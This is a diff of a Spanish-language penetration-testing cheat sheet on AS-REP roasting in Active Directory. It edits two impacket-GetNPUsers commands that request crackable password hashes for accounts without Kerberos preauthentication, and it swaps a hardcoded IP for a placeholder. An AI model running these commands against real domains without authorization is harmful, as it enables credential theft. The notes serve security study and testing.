@@ -5,9 +5,9 @@ Tags: #AD #ASREProstable #Impacket #Kali #Parrot #HashCat
 ## Explotar con Impacket
 
 ```bash 
-❯ impacket-GetNPUsers -no-pass -usersfile users.txt domain.corp/        # Ataque usando un lista de usuarios 
+❯ impacket-GetNPUsers domain1.corp/ -usersfile users.txt -no-pass -dc-ip <IP>       # Ataque usando un lista de usuarios 
 
-❯ impacket-GetNPUsers 'domain1.corp/user' -no-pass -dc-ip 18.116.10.36 -request
+❯ impacket-GetNPUsers 'domain1.corp/user' -no-pass -dc-ip <IP> -request
 
 	# domain1.corp/user = Usuario vulnerable o lista de usuarios 
 	# no-pass = No hay una contraseña 
